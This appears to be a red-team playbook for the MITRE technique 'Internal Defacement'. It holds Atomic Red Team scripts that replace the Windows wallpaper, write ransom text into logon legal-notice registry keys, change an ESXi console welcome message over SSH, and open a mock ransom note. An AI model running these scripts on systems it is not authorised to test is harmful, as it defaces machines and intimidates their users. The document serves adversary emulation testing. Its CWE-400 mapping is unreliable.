---
name: "T1491.001_internal-defacement"
description: "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems."
category: "business-logic"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1491.001
  - impact
  - esxi
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1491.001"
tactic: "impact"
all_tactics:
  - impact
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1491/001"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-400
chains_with:
  - T1491
  - T1491.002
prerequisites:
  - T1491
severity_boost:
  T1491: "Chain with T1491 for deeper attack path"
  T1491.002: "Chain with T1491.002 for deeper attack path"
---

# T1491.001 Internal Defacement

> **Sub-technique of:** T1491

## High-Level Description

An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.

## Kill Chain Phase

- Impact (TA0040)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Internal Defacement technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Internal Defacement
- [ ] Check Linux systems for indicators of Internal Defacement
- [ ] Check macOS systems for indicators of Internal Defacement
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Replace Desktop Wallpaper

Downloads an image from a URL and sets it as the desktop wallpaper.

**Supported Platforms:** windows

```powershell
$url = "#{url_of_wallpaper}"
$imgLocation = "#{wallpaper_location}"
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath "#{pointer_to_orginal_wallpaper}"
$updateWallpapercode = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

         public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@
$wc = New-Object System.Net.WebClient
try{
    $wc.DownloadFile($url, $imgLocation)
    add-type $updateWallpapercode
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
}
catch [System.Net.WebException]{
    Write-Host("Cannot download $url")
    add-type $updateWallpapercode
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
}
finally{
    $wc.Dispose()
}
```

### Atomic Test 2: Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message

Display ransom message to users at system start-up by configuring registry keys HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption and HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeText.

[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection),
[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/),
[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),
[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),
[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),
[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),
[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),
[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = "#{legal_notice_caption}"
$newLegalNoticeText = "#{legal_notice_text}"
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force
```

### Atomic Test 3: ESXi - Change Welcome Message on Direct Console User Interface (DCUI)

Changes the ESXi welcome message to potentially display ransom information.
[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#change%20display%20information)

**Supported Platforms:** windows

```cmd
echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"
```

**Dependencies:**

- Check if we have plink

### Atomic Test 4: Windows - Display a simulated ransom note via Notepad (non-destructive)

Creates a temporary ransom-note text file and opens it in Notepad to
simulate ransomware "note display" behavior without making destructive
changes. SAFE and non-destructive.

**Supported Platforms:** windows

```powershell
$notePath = Join-Path $env:TEMP "#{note_filename}"
$pidPath  = Join-Path $env:TEMP "#{pid_filename}"

$Title = "#{note_title}"
$Body  = "#{note_body}"

$header  = $Title + "`r`n" + ('=' * $Title.Length) + "`r`n`r`n"
$content = $header + $Body

[System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8)

$p = Start-Process notepad.exe -ArgumentList "`"$notePath`"" -PassThru
$p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force
```

**Dependencies:**

- Notepad must be present on the system

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Internal Defacement by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1491.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1053 Data Backup

Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.

## Detection

### Internal Website and System Content Defacement via UI or Messaging Modifications

## Risk Assessment

| Finding                                  | Severity | Impact |
| ---------------------------------------- | -------- | ------ |
| Internal Defacement technique applicable | Low      | Impact |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-400 | Uncontrolled Resource Consumption |

## References

- [Varonis](https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire)
- [Novetta Blockbuster Destructive Malware](https://web.archive.org/web/20160303200515/https:/operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)
- [Novetta Blockbuster](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)
- [Atomic Red Team - T1491.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1491.001)
- [MITRE ATT&CK - T1491.001](https://attack.mitre.org/techniques/T1491/001)
